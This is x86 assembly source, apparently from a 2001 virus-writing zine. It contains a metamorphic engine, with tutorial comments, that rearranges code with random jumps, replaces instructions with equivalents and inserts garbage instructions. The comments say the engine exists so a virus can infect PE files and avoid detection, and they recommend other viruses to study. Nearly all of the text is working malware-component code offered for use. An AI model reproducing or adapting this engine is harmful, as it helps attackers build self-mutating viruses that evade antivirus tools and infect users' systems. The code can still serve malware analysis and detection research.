;Metamorphic engine
;(c) Vecna 2001

;Lets first decide what we want the engine do. We will want the engine
;mix the code in the buffer, insert garbling(using the non-used registers at
;this moment), and change some instructions by
;others. We also want that the engine dont left unused "isles" of data between
;the code. The code must be packed together, with all holes removed, as the
;size is a premium in the way we choose to infect the PE files.

;We will retrieve info about which registers are free and used using the same
;trick i used in lexotan16. A few used instruction will have a special mean
;by the engine. In this case, when the engine find a XOR EBP it will not
;output it, but get the immediate value and use it to determine the changes
;in registers usage. So, the code that the engine need be "special" to take
;full advantage of the engine garbler.

;We will have a base code, and a meta copy will be generated always from it.
;In base code, we must use near version of JMPs and JCCs(coz this i used NASM).
;This must be this way becoz the first phase, of mixing, need be able to move
;the code regardless of the previous offset. So, short offset are no applicable
;in this moment. In subsequent loops, the JMP/JCCs will be optimized

;This is the size of each allocated structure. Increase as you increase the
;amount of code that the engine must process

WORKSIZE equ 16*1024

;These are the params we must pass to engine in the stack

source   equ 20
size     equ 16
userlist equ 12
alloc    equ 8
disasm   equ 4

;The usual here will use a pompous name for the metamorphic engine. Something
;313773. But lets be different and call it simply...

engine:
       pushad

       call @@delta
  @@delta:
       add dwo [esp], -(ofs @@delta-ofs engine)
       pop ebp                          ;lets keep in EBP the delta always

       mov [ebp+ofs seed-ofs engine], esp ;initialize some variables
       xor [ebp+ofs seed-ofs engine], eax
       sub eax, eax
       mov [ebp+ofs recurse-ofs engine], al
       mov [ebp+ofs eip_table_cnt-ofs engine], eax
       mov [ebp+ofs jmp_table_cnt-ofs engine], eax
       mov dwo [ebp+ofs reg32-ofs engine], 0800000efh ;mark all register used

;Our working buffers are calculated to be 8 times the size of input code. This
;should be enought. The engine dont free the mem it allocate, so, is better
;you code you own alloc() returning space in a bigger buffer, to after can do
;a free by yourself as a whole.

       push WORKSIZE
       call [esp+8*4+alloc+4]         ;allocate memory buffers
       mov [ebp+ofs destino-ofs engine], eax
       mov edi, eax

       mov esi, [esp+8*4+source]
       mov [ebp+ofs fonte-ofs engine], esi

       mov eax, [esp+8*4+size]
       mov [ebp+ofs input_size-ofs engine], eax

       push WORKSIZE*8                  ;calculate for the worst case:
       push WORKSIZE*8                  ;a buffer filled of 1 byte instructions
       call [esp+8*4+alloc+4+4]
       mov [ebp+ofs eip_table-ofs engine], eax
       call [esp+8*4+alloc+4]
       mov [ebp+ofs jmp_table-ofs engine], eax

;fill out buffer with NOPs
       call fill_nops

;Now, we choose a random place in the output buffer to be the start of our
;metamorphed version of the input code. I commented this to generate the
;snippets that Billy should have put somewhere in the zine. This becoz i wanted
;to have the entrypoint at 0, to show the generated code in all its glory, and
;from the start.

       mov eax, WORKSIZE-48
       call random
       add edi, eax

;Dis is the first loop. We will loop here for each instruction. Our job is
;keep track of the position, copy the instruction, add garbling, and, random,
;add a jmp. These jmps will be what make the virus, after all the "holes" are
;removed, be mixed.

  @@loop1:
       mov eax, [ebp+ofs input_size-ofs engine]
       add eax, [ebp+ofs fonte-ofs engine]
       cmp esi, eax                     ;we already processed the whole buffer?
       jae @@done_phase1

;Check if we get a XOR EBP, ?. If so, we get the immediate value and copy it
;to the "reg32" var. This way, our garbling engine can know what regs are
;available at the moment.

       cmp wo [esi], 0f581h
       jne @@no_xorebp
       lodsw
       lodsd
       mov [ebp+(ofs reg32-ofs engine)], eax
       jmp @@loop1
  @@no_xorebp:

;We must keep a list of the list of new eip->old eip correspondence, else we
;will not be able to know to where JMP/CALL/JCC

       call link_eip

;Check for CALLs, JMPs and JCCs, and add they to jmps2fix list.
       call check4jmps
       jc @@insert_nocode

;Thereïs a random chance that we will analise the current instruction in input
;buffer to change it for some analogous code.

       call random_f
       jc @@no_metamorph

       mov edx, [esi]           ;get instruction

;The first instruction we will try to modify is the SUB/ADD with dword regs
;and immediate values. If we found one, we invert it and the immediate, so a
;add eax, 12345678h turn in a sub eax,-12345678h, that do the same work. We
;check for normals SUB/ADD, and also for the short versions, using EAX.
       mov eax, edx
       cmp al, 2dh
       je @@add_sub_invert      ;is a eax optimized SUB?
       cmp al, 05h
       je @@add_sub_invert      ;is a eax optimized ADD?
       cmp al, 81h
       jne @@no_add_sub
       and ah, 011111000b
       cmp ah, 0e8h
       je @@sub_add             ;a normal SUB?
       cmp ah, 0c0h
       jne @@no_add_sub         ;a normal add?
  @@sub_add:
       movsw
       xor by [edi-1], 0c0h xor 0e8h    ;invert sub<->add
       jmp @@negate
  @@add_sub_invert:
       lodsb
       xor al, 2dh xor 05h      ;invert optimized form
       stosb
  @@negate:
       lodsd
       neg eax                  ;invert value
       stosd
       jmp @@insert_nocode
  @@no_add_sub:

;Now, lets check if is a MOV of a immediate to a register. If is, we change it
;for a PUSH imm/POP reg. Notice that we dont add a extra link now that one
;instruction become two(or even 3). This is becoz no jmp will be directed
;to this new instruction, so, no need to call. In following cicles, altought,
;they will be manipulated separadly.
       mov eax, edx
       mov ah, al
       and ax, 0000011111111000b        ;al=instruction/ah=register
       cmp al, 0b8h
       jne @@no_mov_imm                 ;if isnt a MOV REG, IMM exit...
       lodsb
       mov al, 068h
       stosb
       movsd                            ;build PUSH IMM
       call garble
       mov al, 058h
       or al, ah
       stosb                            ;build POP REG
       jmp @@insert_nocode
  @@no_mov_imm:

;Now, check for a MOV REG,REG, to change to a PUSH REG/POP REG
       mov eax, edx
       cmp al, 89h
       jne @@no_mov_r2r                ;is mov?
       mov al, ah
       and eax, 01100000000111111b
       cmp ah, 0c0h                     ;sure?
       jne @@no_mov_r2r
       mov ah, al
       and ax, 0000011100111000b        ;reg registers
       shr al, 3
       add ax, 5850h                    ;tranform to PUSH/POP
       stosb
       call garble
       mov al, ah
       stosb
  @@add2andgo:
       inc esi                          ;adjust input buffer by 2
       inc esi
       jmp @@insert_nocode
   @@no_mov_r2r:

;Check for SUB REG,REG, using the same register, and change for something like
;XOR REG REG, AND REG 0 or PUSH/POP
       mov eax, edx
       cmp al, 29h
       jne @@no_sub_0                   ;is a sub reg,reg?
       mov al, ah
       and eax, 1100000000111111b
       cmp ah, 0c0h                     ;sure?
       jne @@no_sub_0
       mov dl, al
       mov ah, al
       and al, 0111b
       shr ah, 3
       cmp al, ah                       ;same 2 registers in sub?
       jne @@no_sub_0
       call random_f
       jc @@no_xor0
       mov al, 31h                      ;encode a XOR REG,REG
       stosb
       or dl, 011000000b        ;0c0
       mov al, dl
       stosb
       jmp @@add2andgo
    @@no_xor0:
       call random_f
       jc @@no_and0
       add ax, 0e083h                   ;encode AND reg, 0
       stosw
       sub eax, eax
       stosb
       jmp @@add2andgo
    @@no_and0:
       push eax
       mov ax, 006ah            ;encode PUSH 0
       stosw
       call garble
       pop eax
       or al, 058h              ;POP REG
       stosb
       jmp @@add2andgo
  @@no_sub_0:

;Now, the check if for XCHG instructions. We will change they to a PUSH REG1/
;PUSH REG2/POP REG1/POP REG2
       mov eax, edx
       cmp al, 87h
       jne @@check_eax_xchg     ;is a XCHG instruction?
       mov al, ah
       and ax, 0011111111000000b
       cmp al, 0c0h
       jne @@no_xchg            ;sure?
       mov al, ah
       and al, 0111b
       shr ah, 3
       inc esi                  ;skip instruction(coz was already processed)
       jmp @@xchg_al_ah         ;ah&al have the regs to swap values
  @@check_eax_xchg:
       mov ah, al
       and ax, 011111111000b
       sub al, 90h
       jne @@no_xchg                    ;is the eax form of XCHG? no, exit
  @@xchg_al_ah:                 ;ah&al have the regs to swap values
       inc esi
       call random_f
       jc @@swap_al_ah
       xchg al, ah
    @@swap_al_ah:
       push eax
       add ax, 5050h            ;make PUSHs
       stosb                          ;store one
       call garble
       mov al, ah
       stosb                            ;then other
       call garble
       pop eax
       add ax, 5858h            ;make POPs
       stosb                          ;store one
       call garble
       mov al, ah
       stosb                    ;the another
       jmp @@insert_nocode
  @@no_xchg:

;Here we check for CMP REG IMM instructions, and, if found, we metamorph they
;to a PUSH REG / SUB REG IMM / POP REG
       sub ebx, ebx            ;default to EAX
       mov eax, edx
       cmp al, 3dh
       je @@cmp_eax                     ;check for short form of CMP
       cmp al, 81h                      ;(altought it dont appear even once)
       jne @@no_cmp
       mov al, ah
       and ax, 011111111000b
       cmp al, 011111000b   ;0f8
       jne @@no_cmp                     ;isnt a CMP at all?
       mov bl, ah
       inc esi
  @@cmp_eax:                            ;ebx=register
       add esi, 5
       lea eax, [ebx+50h]
       stosb                    ;do the PUSH
       call garble
       test ebx, ebx
       je @@is_eax_ver
       mov eax, 0e881h
       or ah, bl
       stosw                    ;version for other regsiters...
       jmp @@store_imm
  @@is_eax_ver:
       mov al, 2dh              ;version for EAX
       stosb
  @@store_imm:
       mov eax, [esi-4]
       stosd
       call garble
       lea eax, [ebx+58h]
       stosb                    ;do the POP
       jmp @@insert_nocode
  @@no_cmp:

;Here are some quickïnïdirt changes in INC EAX. As it is a often used instruction
;our code base, we have specific code to change it. Others kind of INCs occur
;so rarely that i choose for no check for they. Remember you must not check
;for all possible code changes or all possible optimizations. Just do what
;your base code use.
       cmp dl, 40h
       jne @@no_inceax                  ;is a INC EAX?
       inc esi
       mov eax, 01c083h         ;encode a ADD EAX, 1
  @@process_addsub:
       call random_f
       jc @@add_1
       xor ah, 0E8h xor 0c0h
       ror eax, 16              ;or better a SUB EAX, -1
       neg al
       ror eax, 16
  @@add_1:
       stosw
       shr eax, 16
       stosb
       jmp @@insert_nocode
  @@no_inceax:

;By last, we manage the STOSD/LODSD instruction...These are complex instructions
;and, when processed can generate till 5 new instructions. We dont check for
;LODSB/STOSB coz they also occur very rarely in our base code. Also, we assume
;that the direction flag will be cleared. This is ok, since we never set it in
;our code.
       cmp dl, 0abh                     ;is STOSD?
       je @@stosd
       cmp dl, 0adh
       jne @@no_metamorph                ;is LODSD?
       mov ax, 068bh            ;mov eax,[esi]
       jmp @@code_incs
  @@stosd:
       mov ax, 0789h            ;mov [edi],eax
  @@code_incs:
       mov bl, ah
       inc esi
       stosw
       call garble
       call random_f
       jc @@do_incs
       mov eax, 04c083h         ;encode a ADD REG, 4
       or ah, bl
       jmp @@process_addsub
  @@do_incs:
       mov ecx, 4               ;do 4 times...
  @@doloop_inc:
       mov al, 40h
       or al, bl                ;encode a INC
       stosb
       call garble
       loop @@doloop_inc
       jmp @@insert_nocode
  @@no_metamorph:

;The instruction wasnt handled by special routine. So, calculate the size of
;the instruction.
       call [esp+8*4+disasm]

;Now, with the instruction size in eax, we just need copy the instruction to
;output buffer, and add garbling instructions.
       mov ecx, eax
       rep movsb

;Add the garbage, that will be the real protection of the metamorphed code
  @@insert_nocode:
       call garble

;Test random probability of we add a JMP to another point of our out buffer.
;As this occur, our code is mixed in the buffer, generating isles of code +
;garbling between a background of NOPs

  @@change_eip:
       call random_f
       jc @@no_add_jmp
  @@do_change:
       call change_eip
;Notice that this jmp dont need to be added to our jmp_table, coz it is already
;build with the correct displacement. In the next cicles, it will be added to
;this list, as if it was a user-coded JMP

  @@no_add_jmp:

;We need now check it the out buffer position is too near the end of the buffer
;If so, we must exec @@do_change to force a JMP out of there. It will be called
;till it manage to find a free place. The JMP *must* be done. The same happen
;if we detect used areas too near.
       mov eax, [ebp+ofs destino-ofs engine]
       add eax, WORKSIZE-48
       cmp edi, eax                     ;if too near end of buffer, a JMP is
       ja @@do_change                   ;essencial

       push edi
       mov eax, 90909090h
       mov ecx, 12
       repe scasd                       ;check 48 bytes forward
       pop edi
       jne @@do_change                  ;uhh, a used area...

;End of first main loop. Go to next instruction...
       jmp @@loop1
  @@done_phase1:

;All the code was processed, so, now we need fix the JMP/CALL/JCC instructions.
;This is need coz these instructions use the distance to add/sub to eip, and,
;with the code mixed and garbled, this change. So, our jmp_table, a 2 dword
;structure, tell us that "At offset X-4 thereïs a instruction that point to
;the instruction that was at offset Y in old buffer". What we do then is
;get this offset and convert to its current position(using our eip_table).
;Then, we just need recalculate the relative distance and patch the instruct.
;Neat. ;)

       call fix_damn_jmps

;Our engine have the optional ability to process a user list of ptr to old code
;offsets to new code offsets. This is need when you need update a variable
;after the processing by the engine, or your code use a callback, as a thread,
;and you must actualize a pointer to code into other instruction. Lets said, as
;example that you have a code that do push offset Routine1\CreateThread() in
;the code you want to metamorph. After the engine run, Routine1 will not be
;anymore in the offset specified. So, you need update it, and this list is to
;this: update pointers location. A better example is the entrypoint. Lets say
;that your code, that you pass to engine, receive control at first byte (offset
;0). Put 0 in the list, and the engine will put there the new entrypoint, the
;address corresponding to old offset 0. Put a -1 to finish the list.

       call fix_userlist

;By now, the engine can be finished. What we have here is a working engine that,
;given a buffer with code, its size, a optional list of ptrs to keep track on,
;a routine for alloc memory, and a ptr to a disassembly routine(can be lde32,
;by z0mbie), generate a mixed version of it, with garbling instructions insert
;between real code, and real instructions sometimes changed by sinonymous. And
;all this under 2kb. Something that our "article writters" cant even dream ;)

;For others uses, now you just need scan the buffer for the filler(in our case
;NOPs), and replace it by random data. But, for our porpouse, we need optimize
;the generated code to not have anymore this random data "isles", since the
;code will need fit into a space generated by compressing the original content.

;We will do this optimization in a loop, that will cicle all generated buffer
;for wasted space and some code optimization(EAX-using instructions and JMP/
;JCC) and we will execute this loop till no more modifications can be done.

;The old out buffer now will be source of instructions
       push WORKSIZE
       call [esp+8*4+alloc+4]         ;allocate memory buffers

       mov ecx, [ebp+ofs destino-ofs engine]
       mov [ebp+ofs destino-ofs engine], eax
       mov [ebp+ofs fonte-ofs engine], ecx

       mov dwo [ebp+ofs input_size-ofs engine], WORKSIZE

;once again, fill the outbuffer(a new outbuffer) with NOPs
  @@optimize:
       sub eax, eax
       mov dwo [ebp+ofs changes-ofs engine], eax  ;mark no changes done
       mov [ebp+ofs eip_table_cnt-ofs engine], eax
       mov [ebp+ofs jmp_table_cnt-ofs engine], eax

       mov esi, 12345678h
  fonte equ $-4
       mov edi, 12345678h
  destino equ $-4
       call fill_nops

;Hereïs the main optimization loop. We will execute it for each instruction.
  @@optimize_loop:
       mov eax, 12345678h
  input_size equ $-4
       add eax, [ebp+ofs fonte-ofs engine]
       cmp esi, eax
       jae @@optimize_loop_done                 ;all processed?

;Once again, create a table of old eip->new eip relation
       call link_eip

;Now, we check for instructions that dont need be there. First one, obviously,
;is the NOP isntruction.
       mov al, [esi]
       cmp al, 90h
       je @@optimize_loop1              ;skip da NOP!

;Other one we must check is the JMP. If the displacement is 0(it just jump to
;the next instruction), we just skip it.
       cmp al, 0e9h
       jne @@no_jmp
       mov eax, [esi+1]
       test eax, eax
       jnz @@near2short                 ;the JMP jump to the enxt instruction?
       add esi, 4                       ;skip instruction
  @@optimize_loop1:
       inc esi
       inc dwo [ebp+ofs changes-ofs engine]     ;changes were done, so, must
       jmp @@optimize_loop                      ;have a next loop
  @@near2short:

;Check if the JMP can be converted to JMP SHORT. Notice we work in the source
;buffer. This is becoz we want this instruction processed in the current loop.

       call is_signed
       jnz @@no_jcc_near
       mov dwo [esi], 0eb909090h
       mov [esi+4], al
       jmp @@modify
  @@no_jmp:

;Here we check if we can convert the JCC NEAR to the SHORT version. Once again
;we work over ESI.

       mov edx, [esi]
       cmp dl, 0fh
       jne @@no_jcc_near                ;extended opcode?
       mov dl, dh
       and edx, 01111000000001111b
       cmp dh, 80h
       jne @@no_jcc_near                ;make sure is a JMP?
       add dl, 70h
       mov eax, [esi+2]
       call is_signed
       jnz @@no_jcc_near                ;and can be converted?
       mov dh, al
       mov dwo [esi], 90909090h         ;convert da jmp!
       mov wo [esi+4], dx
  @@modify:
       inc dwo [ebp+ofs changes-ofs engine]     ;changes were done...
  @@no_jcc_near:

;Keep keeping track of the JMPs...
       call check4jmps
       jc @@optimize_loop

;Disasm and copy. Notice that we dont insert garbling anymore. This loop is
;for optimization, so, we take things, no add things :=)
       call [esp+8*4+disasm]
       mov ecx, eax
       rep movsb

       jmp @@optimize_loop
  @@optimize_loop_done:

;Now that all instructions were processed, we fix all JMP/CALL/JCCs and the
;user list of pointers.
       call fix_damn_jmps
       call fix_userlist

;Exchange buffer, in case we will re-process the code(modifications were made)
       mov ebx, [ebp+ofs fonte-ofs engine]
       xchg ebx, [ebp+ofs destino-ofs engine]
       mov [ebp+ofs fonte-ofs engine], ebx

;NOw we scan backward for the last NOP. This way, we have the new size of the
;code, without trailing garbage instructions.
       mov ecx, WORKSIZE-1
       lea edi, [ebx+ecx]
       mov al, 90h
       std
       repe scasb                       ;scan for last NOP
       cld
       scasw
       sub edi, ebx
       mov [ebp+ofs input_size-ofs engine], edi ;update new size of data

;Check if changes were done in this pass. IF changes where done, we must redo
;the optimizating loop, coz the modification of one instruction can have a
;chain effect.
       mov ecx, 12345678h
  changes equ $-4
       jecxz @@all_work_done            ;if we didnt any change, we finished
       jmp @@optimize

;Now, our work really is finished. We mixed the code, added the garbling,
;changed instructions, and after we optimized the code generated. I hope you
;reader that reached this point noticed how easy can be write a meta engine,
;if you read the right resources before trying to write a tute. The resources
;i recommend are badboy, ply, tmc, commander bomber, dark paranoid, zcme,
;lexotan, azcme, for DOS. For win32, all z0mbie code about this matter, that
;seens be the only published code for advanced meta. You also can read ghost,
;regswap and evol to get a taste. Z0mbie code is very advanced and uncommented
;and, in meta engines, DOS experience also count, so, if youïre beginner,
;take a good look in the mentioned DOS virus first.

  @@all_work_done:
;Return EDI with mutated code
       mov eax, [ebp+ofs destino-ofs engine]
       mov [esp], eax
;and EAX with the size of the generated code
       mov eax, [ebp+ofs input_size-ofs engine]
       mov [esp+7*4], eax

       popad
       ret 5*4

;Now, we check for JMPs, CALLs and JCCs. If theyïre found, we put they in a
;list, to later be fixed to point to the new offset of the right instruction.
check4jmps:
       sub ebx, ebx             ;default 32b displacement
       mov al, [esi]
       cmp al, 0e9h                     ;is a JMP?
       jne @@no_jmp
  @@is_call:
       movsb
       lodsd
       stosd
  @@do_jmp_table:
       mov ecx, edi                     ;ebx is where patch
       test ebx, ebx             ;default 32b displacement
       jz @@no8b
       bts ecx, 31              ;set higest bit as mark of a 8bit relocation
  @@no8b:
       add eax, esi
       sub eax, [ebp+ofs fonte-ofs engine]     ;add to

;Make a list of relocations. Again is a 2 dword struture, this one mean "At new
;buffer offset X, thereïs a JCC/JMP/CALL that was pointing to the offset Y
;in old buffer". We will use this info to fix these instructions in the right
;moment
       push edi
       mov edi, 12345678h             ;table base
   jmp_table equ $-4
       mov ebx, 12345678h             ;index
   jmp_table_cnt equ $-4
       lea edi, [edi+ebx*8]           ;offset of referenced instruction
       stosd
       mov eax, ecx
       stosd                          ;save patch point
       inc dwo [ebp+ofs jmp_table_cnt-ofs engine]
       pop edi
       jmp @@loop
;we keep cheing for CALLs, JCCs and short versions of JMPs and JCCs
  @@no_jmp:
       cmp al, 0e8h                     ;maybe a CALL?
       je @@is_call
       cmp al, 0fh
       jne @@isnt_jcc_near                   ;extended opcode?
       mov al, [esi+1]
       and al, 011110000b
       cmp al, 80h                      ;is a near JCC?
       jne @@isnt_jcc_near
       movsb
       jmp @@is_call
  @@isnt_jcc_near:
       cmp al, 0ebh
       jne @@no_short_jmp
  @@short_shit:
       lodsw
       stosw
       movsx eax, ah
       inc ebx
       jmp @@do_jmp_table
  @@no_short_jmp:
       and al, 011110000b
       cmp al, 70h
       je @@short_shit
       test al, ?
     org $-1
  @@loop:
       stc
       ret

;Make a table of new eip->old eip. Is a 2 dword structure that mean "The code
;in new buffer at offset X is the same in old buffer at Y". We need this info
;to fix jcc/jmp/calls.
link_eip:
       pushad                         ;save current edi
       mov eax, edi
       mov edi, 12345678h             ;table base
   eip_table equ $-4
       mov ecx, 12345678h             ;index
   eip_table_cnt equ $-4
       lea edi, [edi+ecx*8]           ;place to put eip/eip
       sub eax, [ebp+ofs destino-ofs engine]
       stosd
       mov eax, esi
       sub eax, [ebp+ofs fonte-ofs engine]
       stosd                          ;save esi
       inc dwo [ebp+ofs eip_table_cnt-ofs engine]
       popad
       ret

;Given a old EIP in EAX, return in EAX the new EIP correspondent
xref:
       pushad
       mov ecx, [ebp+ofs eip_table_cnt-ofs engine]
       mov esi, [ebp+ofs eip_table-ofs engine]
  @@xref_loop:
       dec ecx
       js @@found
       cmp [esi+ecx*8+4], eax
       jne @@xref_loop
  @@equal:
       mov ecx, [esi+ecx*8]
  @@found:
       mov [esp+7*4], ecx
       popad
       ret

;Try to insert a JMP to a random free place in our outbuffer.
change_eip:
       pushad
       mov eax, WORKSIZE-48
       call random
       add eax, [ebp+ofs destino-ofs engine]
       mov ebx, eax                    ;And check if is free
       mov edi, 90909090h
       cmp [eax-4], edi
       jne @@no_eip_change
       xchg edi, eax
       mov ecx, 12
       repe scasd                       ;unused space?
       jne @@no_eip_change
       sub edi, 48+5
       mov eax, ebx
       xchg eax, [esp]                  ;set the new eip
       xchg eax, edi
       sub eax, edi
       stosb
       stosd                    ;displacement
       mov by [edi-5], 0e9h            ;build JMP
  @@no_eip_change:
       popad
       ret

fix_userlist:
       mov ecx, [esp+8*4+userlist+4]    ;get start of userlist
       jecxz @@done_userlist            ;no list exit...
       xchg ecx, esi
  @@next_userptr:
       lodsd
       cmp eax, -1
       je @@done_userlist               ;no more pointers to process? exit...
       call xref
       mov [esi-4], eax                 ;update ptr
       jmp @@next_userptr
  @@done_userlist:
       ret

;This routine fix the damn JMPs using the 2 tables previously constructed
fix_damn_jmps:
       mov ebx, [ebp+ofs jmp_table_cnt-ofs engine]
       mov esi, [ebp+(ofs jmp_table-ofs engine)]
  @@fix_jmp:
       dec ebx                          ;for all jmps, do...
       js @@done_fix_jmp
       mov eax, [esi+ebx*8]
       mov edi, [esi+ebx*8+4]
       call xref                        ;translate old offset to new
       mov edx, edi
       btr edx, 31
       mov ecx, edx
       sub ecx, [ebp+(ofs destino-ofs engine)]
       sub eax, ecx                     ;calculate new relative distance
  @@near:
       bt edi, 31
       jc @@short
       mov [edx-4], eax             ;and patch
       jmp @@fix_jmp
  @@short:
       mov [edx-1], al             ;patch 8b displacement
       jmp @@fix_jmp
  @@done_fix_jmp:
       ret

;Return Z if the offset in EAX can be represented in 8bit
is_signed:
       push ecx
       movsx ecx, al
       cmp eax, ecx
       pop ecx
       ret

;Random number routines.
random_f:
       push eax
       call random0
       pop eax
       ret

random0:
       mov eax, -1

random:
       push ebp ecx edx
       push eax
       mov eax, 12345678h
  seed equ dwo $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       mov [ebp+(ofs seed-ofs engine)], eax
       pop ecx
       sub edx, edx
       div ecx
       xchg eax, edx                           ;value = rnd MOD limit
       pop edx ecx ebp
       sahf
       ret

;Fill with NOPs a buffer...
fill_nops:
       push edi
       mov ecx, WORKSIZE                     ;fill outbuffer with NOPs
       mov al, 90h
       rep stosb
       pop edi
       ret

;Here are the garbling routines... they are the heart of the meta engine, as
;garbage is inserted between each instruction. One of the advantages of code
;virus at long time is that much things you only need code once. This code was
;developed first for Cocaine virus. With some changes, it will fit exactly in
;our new engine ;)

;First, the routines to handle the registers. Not all possible operations where
;implemented in these routines, as we only need query about free registers,
;and never allocate or free one by ourselfs. More functions, making all the
;interactions by the use of a dedicated routine, is the right approach to
;isolate bugs and structurate the code.

;Return a random registers(EAX,ECX,EDX,EBX,EBP,ESI,EDI)...
GetAnyReg:
       call random0                     ;get random number between 0..7
       and eax, 0111b                   ;that correspond to the eax..edi range
       cmp al, 4
       je GetAnyReg                     ;cant be ESP
       ret

;Return a free 8 bit register(AL,CL,DL,BL,AH,CH,DH,BH)...
Get8bitRegFree:
       db 0b8h                          ;build the variable inside the MOV
  reg32 dd 0                            ;to get the current used/free registers
       and eax, 01111b                  ;just keep the e?x registers
       cmp eax, 01111b
       jne @@somefree                   ;all are in use?
       stc
       ret                              ;yeahh, error...
  @@somefree:
       call random0                     ;choose a register that have 8 bits
       and eax, 011b                    ;al,cl,dl,bl
       bt [ebp+(ofs reg32-ofs engine)], eax ;is used? choose another
       jc @@somefree
       call random_f                    ;random flag
       jc @@lowpart
       or al, 0100b                     ;turn to hi-part (ah,ch,dh,bh)
  @@lowpart:
       clc
       ret

;Get a register that is not used...
Get32bitRegFree:
       call GetAnyReg                   ;get a 32bit reg
       bt [ebp+(ofs reg32-ofs engine)], eax
       jc Get32bitRegFree                     ;and check if in use
       ret

;This routine is the main one of the garbling part of the engine. We will call
;it to insert random instructions, using the current free registers, between
;all the real instructions of our routine.

MAX_RECURSION equ 3           ;more recursion, more code generated

garble:
ret	;***
       pushad
       mov cl, 12h
  recurse equ $-1
       inc by [ebp+(ofs recurse-ofs engine)]
       cmp cl, MAX_RECURSION                ;we cant left this routine go
       jae @@too_deep                       ;very deep recursively
       call random0
       and eax, 0111b
       sub eax, 2
       jbe @@too_deep                       ;no garbling this time
       mov ecx, eax
  @@next_garble:
       push ecx
       mov eax, (ofs garbling_routines_end-ofs garbling_routines)/4  ;choose a random garbling routine
       call random                          ;in the table
       lea esi, [ebp+(ofs garbling_routines-ofs engine)+eax*4]
       lodsd
       add eax, ebp
       cmp dwo [ebp+(ofs reg32-ofs engine)], 10000000000000000000000011101111b
       je @@skip_add_garble                   ;no registers available
       call eax                         ;call garbling routine
       call random_f
       jc @@no_changeeip
       jz @@no_changeeip
       jns @@no_changeeip               ;thereïs a small chance to add a JMP
  @@skip_add_garble:                    ;if garbling was added.
       call change_eip                  ;but we always add a JMP if no code
  @@no_changeeip:                       ;was generated.
       pop ecx
       loop @@next_garble
  @@too_deep:
       dec by [ebp+(ofs recurse-ofs engine)]
       mov [esp], edi                   ;actualize copy of edi in stack
       popad
       ret

;Here are the individual routines, responsible for generating each kind of
;instruction. I will not comment each.

lea_dword:
       call Get32bitRegFree
       jc @@eror
       push eax
       mov al, 8dh
       stosb
       pop eax
       shl eax, 3
       push eax
       call GetAnyReg
       pop edx
       or eax, edx
       or al, 80h
       stosb
       call random0
       stosd
  @@eror:
       ret

math_byte:
       bt dwo [ebp+ofs reg32-ofs engine], 31
       jc @@1
       mov eax, 8
       call random
       shl eax, 3
       or eax, 1000000011000000b               ;make math operation
       push eax
       call Get8bitRegFree
       pop edx
       jc @@1
       or eax, edx
       xchg al, ah
       stosw
       call random0
       stosb                                   ;byte
  @@1:
       ret

math_word:
       bt dwo [ebp+ofs reg32-ofs engine], 31
       jc @@1
       mov ax, 8166h
       stosw
       call _math_imm
       stosw
  @@1:
       ret

math_dword:
       bt dwo [ebp+ofs reg32-ofs engine], 31
       jc @@1
       mov al, 81h
       stosb
       call _math_imm
       stosd
  @@1:
       ret

_math_imm:
       mov eax, 8
       call random
       shl eax, 3
       or al, 11000000b
       push eax
       call Get32bitRegFree
       pop edx
       or eax, edx                             ;patch reg into
       stosb
       call random0
       ret

push_pop:
       call GetAnyReg
       or al, 50h
       stosb
       call garble                             ;recurse into
       call Get32bitRegFree
       or al, 58h
       stosb
       ret

movr_byte:
       call GetAnyReg
       push eax
       call Get8bitRegFree
       jnc @@1
       pop eax
       ret
  @@1:
       push eax
       mov al, 08ah
       jmp _reg_reg

movr_word:
       mov al, 66h                             ;word-size prefix
       stosb

movr_dword:
       call GetAnyReg
       push eax
       call Get32bitRegFree
       push eax
       mov al, 08bh
  _reg_reg:
       stosb
       pop eax                                 ;destino
       pop edx                                 ;source
       shl eax, 3
       or eax, edx
       or eax, 11000000b
       stosb
       ret

mov_dword:
       call Get32bitRegFree
       or al, 0b8h
       stosb
       call random0
       stosd
       ret

mov_word:
       mov al, 66h
       stosb
       call Get32bitRegFree
       or al, 0b8h
       stosb
       call random0
       stosw
       ret

mov_byte:
       call Get8bitRegFree
       jc @@1
       or al, 0b0h
       stosb
       call random0
       stosb
  @@1:
       ret

inc_dec:
       bt dwo [ebp+ofs reg32-ofs engine], 31
       jc @@0
       call Get32bitRegFree
       add al, 40h
       call random_f
       jc @@1
       or al, 01000b                           ;inc/dec
  @@1:
       stosb
  @@0:
       ret

mov_zs_x:
       call random0
       mov eax, 0b60fh
       js @@1
       mov ah, 0beh                            ;z/s
  @@1:
       adc ah, 0                               ;16/8
       stosw
       call GetAnyReg
       push eax
       call Get32bitRegFree
       shl eax, 3
       pop edx
       or eax, edx
       or al, 0c0h
       stosb
       ret

;The garble routine randomly choose a ptr from this table to call to generate
;the garbage instructions. So, the more the pointer to routine appear, more
;frequent will be this code generated. Good to adjust the proportion of each
;in generated code, else it will look very suspicious.

garbling_routines:
       dd ofs math_word-ofs engine
       dd ofs movr_word-ofs engine      ;The 16b instructions are rare under
       dd ofs mov_word-ofs engine       ;32b envoroments

       dd ofs mov_zs_x-ofs engine       ;MOVSX/MOVZX also are rare

       dd ofs math_byte-ofs engine
       dd ofs math_byte-ofs engine
       dd ofs movr_byte-ofs engine
       dd ofs movr_byte-ofs engine
       dd ofs mov_byte-ofs engine
       dd ofs mov_byte-ofs engine       ;operations with bytes are common

       dd ofs inc_dec-ofs engine
       dd ofs inc_dec-ofs engine        ;and INC/DECs are common too

       dd ofs push_pop-ofs engine
       dd ofs push_pop-ofs engine
       dd ofs push_pop-ofs engine       ;PUSH/POPs appear often in win32 code

       dd ofs lea_dword-ofs engine
       dd ofs lea_dword-ofs engine
       dd ofs lea_dword-ofs engine      ;the LEA instruction is also very used

       dd ofs math_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs mov_dword-ofs engine
       dd ofs mov_dword-ofs engine
       dd ofs mov_dword-ofs engine
       dd ofs mov_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs math_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs movr_dword-ofs engine
       dd ofs mov_dword-ofs engine
